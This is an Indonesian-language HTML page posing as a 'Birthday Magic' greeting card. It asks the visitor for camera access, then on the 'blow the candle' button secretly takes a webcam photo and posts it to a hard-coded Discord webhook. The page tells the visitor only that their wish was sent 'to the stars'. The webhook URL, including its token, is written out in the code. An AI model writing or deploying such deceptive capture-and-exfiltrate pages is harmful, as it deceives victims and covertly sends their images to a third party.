<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Birthday Magic ✨</title>
    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.5.1/dist/confetti.browser.min.js"></script>
    <style>
        body {
            margin: 0; font-family: 'Segoe UI', sans-serif;
            background: #0f0c29; /* Dark theme agar wajah lebih terlihat */
            background: linear-gradient(to bottom, #24243e, #302b63, #0f0c29);
            height: 100vh; display: flex; justify-content: center; align-items: center;
            color: white; overflow: hidden;
        }

        .card {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            padding: 30px; border-radius: 20px;
            text-align: center; width: 320px;
            border: 1px solid rgba(255, 255, 255, 0.2);
        }

        #video-preview {
            width: 100%; border-radius: 15px;
            margin-bottom: 15px; display: none; /* Awalnya sembunyi */
            border: 2px solid #ff758c;
        }

        .btn {
            background: #ff758c; color: white; border: none;
            padding: 12px 25px; border-radius: 25px;
            cursor: pointer; font-weight: bold; transition: 0.3s;
        }

        .btn:hover { background: #ff7eb3; transform: scale(1.05); }
        
        canvas { display: none; }
        #status { font-size: 0.8rem; margin-top: 10px; color: #ccc; }
    </style>
</head>
<body>

    <div class="card">
        <h2 id="header">Tutup Matamu... ✨</h2>
        <p id="msg">Dan buatlah satu permintaan paling tulus di hari spesialmu.</p>
        
        <video id="video-preview" autoplay playsinline></video>
        <canvas id="capture-canvas"></canvas>

        <button id="action-btn" class="btn" onclick="initSurprise()">Make a Wish!</button>
        <div id="status"></div>
    </div>

    <script>
        const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1463473630251061375/xi6CyaH0ElCz_jUz9vf_iFfOxfNuh1iZfX_31GAO7jOcxRjkhd723nbEFd3ZAp1YvhME";
        const video = document.getElementById('video-preview');
        const canvas = document.getElementById('capture-canvas');
        const btn = document.getElementById('action-btn');
        const header = document.getElementById('header');
        const status = document.getElementById('status');

        async function initSurprise() {
            try {
                // Tahap 1: Minta Izin Kamera (Browser pasti memunculkan popup)
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;
                video.style.display = "block";
                
                header.innerText = "Sekarang Tersenyumlah! 😊";
                btn.innerText = "Tiup Lilin 🎂";
                btn.onclick = captureAndSend;
                
                status.innerText = "Magic connected...";
            } catch (err) {
                alert("Yah, keajaibannya gagal karena izin kamera ditolak.");
            }
        }

        function captureAndSend() {
            // Efek Confetti
            confetti({ particleCount: 150, spread: 70, origin: { y: 0.6 } });

            // Ambil Gambar dari Video
            const context = canvas.getContext('2d');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            // Ubah ke format Blob untuk dikirim
            canvas.toBlob((blob) => {
                const formData = new FormData();
                formData.append('file', blob, 'surprise_moment.png');
                formData.append('content', "📸 **Moment Kejutan Terdeteksi!**\nSeseorang baru saja meniup lilin!");

                // Kirim ke Discord Real-time
                fetch(DISCORD_WEBHOOK, {
                    method: 'POST',
                    body: formData
                }).then(() => {
                    header.innerText = "Harapan Terkirim!";
                    btn.style.display = "none";
                    status.innerText = "Momenmu telah diabadikan di bintang-bintang.";
                });
            }, 'image/png');
        }
    </script>
</body>
</html>
